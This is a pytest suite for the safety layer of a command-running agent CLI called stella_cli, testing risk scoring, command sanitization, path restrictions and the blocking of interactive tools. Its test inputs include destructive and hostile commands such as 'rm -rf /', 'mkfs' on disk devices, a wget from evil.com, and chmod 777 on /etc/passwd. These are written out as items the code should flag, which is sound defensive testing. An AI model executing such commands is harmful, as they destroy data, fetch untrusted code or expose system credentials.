import sys
import pytest
from unittest.mock import MagicMock, patch

# --- 1. SMART MOCKING SETUP ---

# We need a fake @tool decorator. 
# Without this, @tool turns your functions into MagicMocks, deleting their logic.
def fake_tool_decorator(func):
    """A pass-through decorator that keeps the original function logic."""
    def wrapper(*args, **kwargs):
        return func(*args, **kwargs)
    # We attach the original function to .func so existing tests (if any) using .func work
    wrapper.func = func 
    return wrapper

# Create a mock module for tools
mock_tools_module = MagicMock()
mock_tools_module.tool = fake_tool_decorator

# Apply Mocks
sys.modules["langchain_core"] = MagicMock()
sys.modules["langchain_core.tools"] = mock_tools_module # <--- Use our smart mock here
sys.modules["langchain_core.messages"] = MagicMock()
sys.modules["langchain_core.callbacks"] = MagicMock()
sys.modules["langchain"] = MagicMock()
sys.modules["langchain_ollama"] = MagicMock()
sys.modules["langchain.agents"] = MagicMock()
sys.modules["rich"] = MagicMock()
sys.modules["rich.console"] = MagicMock()
sys.modules["rich.markdown"] = MagicMock()
sys.modules["rich.theme"] = MagicMock()
sys.modules["rich.panel"] = MagicMock()
sys.modules["prompt_toolkit"] = MagicMock()
sys.modules["prompt_toolkit.history"] = MagicMock()
sys.modules["prompt_toolkit.formatted_text"] = MagicMock()

# Mock sys.argv to prevent argparse from failing
with patch.object(sys, 'argv', ['stella_cli.py']):
    import stella_cli

# --- 2. TEST SUITE ---

class TestSafetyLogic:
    
    # --- RISK ANALYSIS TESTS ---
    @pytest.mark.parametrize("command, expected_risk", [
        ("ls -la", "low"),
        ("echo 'hello world'", "low"),
        ("rm file.txt", "low"),       
        ("rm -rf /", "critical"),
        ("sudo reboot", "critical"),
        ("mkfs.ext4 /dev/sda", "critical"),      # This previously failed
        ("mkfs.vfat /dev/sdb", "critical"),      # New variant test
        ("wget http://evil.com/script.sh", "critical"),
        ("chmod 777 /etc/passwd", "critical"),
    ])
    def test_analyze_risk(self, command, expected_risk):
        assert stella_cli.analyze_risk(command) == expected_risk

    # --- COMMAND SANITIZATION TESTS ---
    def test_sanitize_curl_timeout(self):
        cmd = "curl https://example.com"
        assert "--max-time" in stella_cli.sanitize_command(cmd)

    def test_sanitize_systemctl_full(self):
        cmd = "systemctl status nginx"
        sanitized = stella_cli.sanitize_command(cmd)
        assert "-l" in sanitized or "--full" in sanitized

    # --- WRITE FILE RESTRICTIONS TESTS ---
    def test_write_file_blocked_directories(self):
        forbidden_paths = ["/etc/shadow", "/boot/config", "/usr/bin/malware"]
        for path in forbidden_paths:
            # Now we call the function directly (no .func needed, but wrapper handles it)
            result = stella_cli.write_file(path, "malicious data") 
            assert "forbidden" in result.lower() or "error" in result.lower()

    def test_write_file_allowed_directories(self, tmp_path):
        safe_path = tmp_path / "safe.txt"
        result = stella_cli.write_file(str(safe_path), "safe data")
        assert "Success" in result
        assert safe_path.read_text() == "safe data"

    # --- INTERACTIVE TOOL BLOCKING TESTS ---
    def test_interactive_tools_blocked(self):
        interactive_cmds = ["vim /tmp/test", "htop", "telnet 1.1.1.1"]
        
        for cmd in interactive_cmds:
            with patch("subprocess.run") as mock_run:
                with patch("builtins.input", return_value="y"): 
                     result = stella_cli.run_linux_command(cmd)
                
                assert "blocked" in result.lower() or "error" in result.lower()
                mock_run.assert_not_called()
